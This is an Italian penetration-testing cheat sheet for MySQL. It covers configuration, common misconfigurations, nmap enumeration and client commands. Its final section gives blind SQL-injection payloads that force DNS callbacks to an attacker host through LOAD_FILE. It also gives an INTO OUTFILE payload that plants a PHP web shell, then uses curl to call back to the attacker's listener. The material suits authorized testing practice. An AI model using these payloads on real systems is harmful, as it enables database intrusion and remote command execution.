# MySQL — Database Relazionale
**Porte:** 3306 (TCP)  
**Categoria:** Database

Database relazionale open source. Architettura client-server.
Molto diffuso nelle applicazioni web (LAMP stack: Linux + Apache + MySQL + PHP).
I client usano query SQL per accedere/modificare i dati.

## Configurazione

- Installazione: sudo apt install mysql-server -y
- Config: /etc/mysql/mysql.conf.d/mysqld.cnf
- Vedere config: cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v '#' | sed -r '/^\s*$/d'

## Vulnerabilità comuni

- Root senza password — accesso amministratore totale al database
- debug/sql_warnings attivi — messaggi dettagliati rivelano struttura DB (utile per SQL injection)
- secure_file_priv mal configurato — lettura/scrittura file del sistema operativo via MySQL
- Credenziali nel file di configurazione con permessi troppo aperti → password in chiaro
- admin_address esposto su Internet → attaccabile da chiunque

## Enumerazione & Comandi

### SCAN

```bash
sudo nmap -sV -sC -p3306 --script mysql* <IP>        # Scan + tutti gli script NSE MySQL
```

### CONNESSIONE

```bash
mysql -u root -h <IP>                                 # Tentativo senza password
mysql -u root -p'P4SSw0rd' -h <IP>                   # Con password
mysql -u root -p'P4SSw0rd' -h <IP> --skip-ssl        # Se SSL dà problemi
```

### COMANDI UTILI DENTRO MYSQL

```bash
  show databases;                                     # Lista tutti i database
  use <database>;                                     # Seleziona un database
  show tables;                                        # Lista tabelle
  show columns from <table>;                          # Struttura di una tabella
  select * from <table>;                              # Tutti i dati
  select * from <table> where <col> = '<val>';        # Filtra per valore
  use sys; select host, unique_users from host_summary;  # Chi si connette da dove
```

## OOB con catch

MySQL supporta OOB via DNS per confermare blind SQLi.

```bash
catch dns on
catch dns token
```

### Blind SQLi — conferma via DNS (Linux)

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',<TOKEN>,'.<LHOST>\\x'))-- -
```

### Blind SQLi — conferma via DNS (Windows + UNC)

```sql
' UNION SELECT LOAD_FILE('\\\\<TOKEN>.<LHOST>\\x\\f')-- -
```

→ `catch logs dns` mostra la query DNS con il token.

### Conferma blind RCE via TCP

```bash
catch tcp on --port 4444
```

Se hai accesso a `INTO OUTFILE` + web shell:

```sql
' UNION SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/s.php'-- -
# Poi: curl http://<TARGET>/s.php?c=curl+http://<LHOST>:4444/rce
```

## Tool consigliati

*Installa con `use <tool>` + `install`*

- **nmap**
